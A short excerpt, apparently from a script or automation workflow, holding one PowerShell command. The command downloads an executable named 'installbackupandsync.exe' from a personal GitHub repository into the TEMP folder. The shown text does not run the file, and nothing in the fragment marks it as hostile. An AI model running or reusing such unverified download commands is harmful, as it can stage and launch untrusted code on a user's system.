...
& {$G = $env:TEMP + '\installbackupandsync.exe'; Invoke-WebRequest 'https://github.com/RetrixDev/mirrorbot-workflow/blob/main/installbackupandsync.exe?raw=true' -OutFile $G}
